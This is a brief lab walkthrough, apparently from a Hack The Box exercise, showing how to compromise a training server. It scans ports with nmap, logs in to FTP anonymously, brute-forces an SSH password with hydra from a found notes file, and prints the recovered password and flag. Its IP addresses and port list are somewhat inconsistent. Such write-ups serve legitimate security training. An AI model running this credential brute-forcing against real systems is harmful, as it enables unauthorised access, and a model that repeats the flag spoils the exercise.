The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

## Question
Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.

## Solution
```shell
> nmap -sC -sV 10.129.72.129
22/tcp   open  ssh      OpenSSH 8.2p1
53/tcp   open  domain   ISC BIND 9.16.1
110/tcp  open  pop3     Dovecot pop3d
95/tcp   open  ssl/pop3 Dovecot pop3d
2121/tcp open  ftp
30021/tcp open  unknown (FTP)
Domain:
 - inlanefreight.htb


Anonymous connection to ftp port 30021:
> ftp 10.129.196.130 -p 30021

We find a simon directory and 'mynotes.txt' with what looks like passwords. Let's brute force

> hydra -l simon -P mynotes.txt ssh://10.129.196.130:22
login: simon   password: 8Ns8j1b!23hs4921smHzwn
We can now connect to the target through ssh.

ssh> cat flag.txt
HTB{1qay2wsx3EDC4rfv_M3D1UM} 
```